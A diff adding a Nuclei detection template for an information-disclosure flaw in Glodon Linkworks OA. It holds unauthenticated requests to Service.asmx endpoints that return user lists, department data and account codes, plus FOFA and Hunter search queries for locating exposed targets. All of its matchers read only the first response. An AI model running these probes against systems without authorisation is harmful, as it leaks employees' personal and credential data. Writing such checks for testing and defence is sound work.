@@ -1,0 +1,58 @@
+id: glodon-linkworks-service-disclosure
+
+info:
+  name: 广联达oa Linkworks Service.asmx 敏感信息泄露
+  author: Y3y1ng
+  severity: high
+  description: |
+    广联达 Linkworks办公OA存在信息泄露，攻击者可通过此漏洞获取网站后台敏感信息。
+    FOFA: body="/Services/Identification/"
+    HUNTER: web.body="/Services/Identification/"
+  reference:
+    - https://mp.weixin.qq.com/s/aZCgwwN6aMwfwu4XBKw3vA
+  tags: glodon,linkworks,disclosure,oa
+
+http:
+  - raw:
+      - |
+        GET /Org/service/Service.asmx/GetAllUsersXml HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /Org/service/Service.asmx/GetDeptXml4GEPS HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: 用户信息泄露
+        dsl:
+          - "status_code_1==200"
+          - contains(body_1, '<?xml')
+          - contains(body_1, 'UserId=')
+          - contains(body_1, 'Code=')
+          - contains(body_1, 'SPlantId=')
+          - contains(body_1, 'SUserId=')
+        condition: and
+
+      - type: dsl
+        name: 公司项目信息泄露
+        dsl:
+          - "status_code_1==200"
+          - contains(body_1, '<?xml')
+          - contains(body_1, 'ReturnData')
+          - contains(body_1, 'NewDataSet')
+          - contains(body_1, 'DEP_ID')
+          - contains(body_1, 'DEP_PARENT_ID')
+        condition: and
+
+      - type: dsl
+        name: 账户密码信息泄露
+        dsl:
+          - "status_code_1==200"
+          - contains(body_1, '<?xml')
+          - contains(body_1, 'ReturnData')
+          - contains(body_1, 'NewDataSet')
+          - contains(body_1, 'USR_ID')
+          - contains(body_1, 'USR_CODE')
+        condition: and
